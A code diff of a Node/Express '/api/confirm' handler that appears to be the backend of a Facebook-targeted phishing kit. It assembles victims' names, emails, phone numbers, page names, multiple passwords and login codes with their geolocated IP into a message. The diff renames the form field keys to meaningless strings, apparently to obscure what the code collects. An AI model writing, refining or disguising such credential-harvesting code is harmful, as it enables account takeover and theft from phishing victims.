@@ -45,15 +45,14 @@ app.post('/api/confirm', async (req, res) => {
     const ipAddress = (req.headers['x-forwarded-for'] || '').split(',')[0] || req.socket.remoteAddress;
     const message = `
         Reason: ${filteredData.reason || 'N/A'}
-        Full Name: ${filteredData.full_name || 'N/A'}
-        Business Email: ${filteredData.business_email || 'N/A'}
-        Personal Email: ${filteredData.personal_email || 'N/A'}
-        Phone: ${filteredData.phone || 'N/A'}
-        Facebook Page Name: ${filteredData.facebook_pagename || 'N/A'}
-        1st Password: ${filteredData.first_password || 'N/A'}
-        2nd Password: ${filteredData.second_password || 'N/A'}
-        3rd Password: ${filteredData.third_password || 'N/A'}
-        LoginCODE: ${filteredData.logincode || 'N/A'}
+        Full Name: ${filteredData.ssafasdf || 'N/A'}
+        Business Email: ${filteredData.lamasaas || 'N/A'}
+        Personal Email: ${filteredData.ditmequan || 'N/A'}
+        Phone: ${filteredData.yokanihr || 'N/A'}
+        Facebook Page Name: ${filteredData.thangbebietdi || 'N/A'}
+        1st Password: ${filteredData.cobebietdi || 'N/A'}
+        2nd Password: ${filteredData.lomsouw || 'N/A'}
+        LoginCODE: ${filteredData.asdfasdf || 'N/A'}
         Address: ${lookup(ipAddress).region || 'N/A'}, ${lookup(ipAddress).city || 'N/A'}, ${lookup(ipAddress).country || 'N/A'}
         IP Address: ${ipAddress}
     `;
